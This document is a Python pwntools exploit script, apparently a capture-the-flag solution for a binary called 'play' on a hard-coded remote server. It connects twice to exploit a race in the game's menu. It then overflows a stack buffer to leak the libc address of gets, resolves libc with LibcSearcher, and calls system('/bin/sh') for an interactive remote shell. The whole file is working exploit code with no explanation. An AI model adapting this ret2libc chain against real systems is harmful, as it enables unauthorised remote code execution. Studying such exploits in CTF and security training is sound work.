from pwn import *
from LibcSearcher import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io1 = process('play')
# io2 = process('play')
io1 = remote('111.200.241.244', 50230)
io2 = remote('111.200.241.244', 50230)
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc6-amd64_2.13-20ubuntu5.3_i386.so')
elf = ELF('play')
vul_func = elf.sym['vul_func']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
gets_got = elf.got['gets']


def login():
    io1.sendlineafter('login:', 'test')
    io2.sendlineafter('login:', 'test')


def attack(io):
    io.sendlineafter('choice>> ', '1')


def change_skill(io, choice):
    io.sendlineafter('choice>> ', '3')
    io.sendlineafter('choice>> ', str(choice))


def use_hiden(io):
    io.sendlineafter('use hiden_methods?(1:yes/0:no):', '1')


def pwn():
    login()
    while True:
        change_skill(io1, 3)
        attack(io1)
        change_skill(io2, 1)
        use_hiden(io1)
        re = io1.recvline()
        if b'you win\n' in re:
            re = io1.recvline()
            if b'we will remember you forever!\n' in re:
                break
    payload = cyclic(0x4c) + p32(puts_plt) + p32(vul_func) + p32(gets_got)
    io1.sendlineafter('what\'s your name:', payload)
    io1.recvline()
    gets_addr = u32(io1.recvn(4))
    libc = LibcSearcher('gets', gets_addr)  
    libc_base = gets_addr - libc.dump('gets')  
    log.success('libc_base: ' + hex(libc_base)) 
    system = libc_base + libc.dump('system')  
    bin_sh = libc_base + libc.dump('str_bin_sh') 

    payload = cyclic(0x4c) + p32(system) + p32(vul_func) + p32(bin_sh)
    io1.sendlineafter('what\'s your name:', payload)
    io1.interactive()


if __name__ == '__main__':
    pwn()
